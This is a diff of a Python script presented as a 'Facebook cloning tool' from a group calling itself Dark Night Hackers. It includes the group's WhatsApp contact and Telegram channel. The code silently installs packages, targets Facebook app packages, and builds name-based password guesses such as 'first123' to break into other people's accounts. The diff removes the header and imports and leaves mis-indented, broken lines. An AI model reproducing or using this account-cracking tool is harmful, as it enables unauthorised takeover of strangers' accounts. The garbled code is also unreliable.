@@ -1,27 +1,4 @@
-#DARK NIGHT HACKERS
-#AFG
-#WE ARE BROTHERS
-#CONTACT WITH ADMIN MRr PARWIZ AFGHAN's WHATSAPP : +93790510608
-#JOIN OUR TELEGRAM CHANNEL :  @https://t.me/DarkNightHacker001
-from os import path
-import os,base64,zlib,pip,urllib
-try:
-        import os,requests,json,time,re,random,sys,uuid,string,subprocess
-        from string import *
-        from concurrent.futures import ThreadPoolExecutor as tred
-except ModuleNotFoundError:
-        os.system(f'pip install requests futures==2 > /dev/null')
-except:pass
-fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
-try:
-	import os,requests,json,time,re,random,sys,uuid,string,subprocess
-	from string import *
-	import bs4
-	from concurrent.futures import ThreadPoolExecutor as tred
-	from bs4 import BeautifulSoup as sop
-	from bs4 import BeautifulSoup
-except ModuleNotFoundError: 
-	print('\n Installing missing modules ...')
+print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
 	os.system('python AWM.py')
 print('\n\033[1;31m ⚡𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝙳.𝙽 𝙷𝙰𝙲𝙺 𝙵𝙱 𝙲𝙻𝙾𝙽𝙴𝙸𝙽𝙶 𝚃𝙾𝙾𝙻𝚂 ⚡');time.sleep(3)
@@ -108,7 +85,7 @@ def menu():
                                         plist.append('last123')
                                         plist.append('firstlast123')
                                         plist.append('first143')
-                                        plist.append('first12                     
+                                        plist.append('first12')                    
                                 else:
                                         try:
                                                 clear()
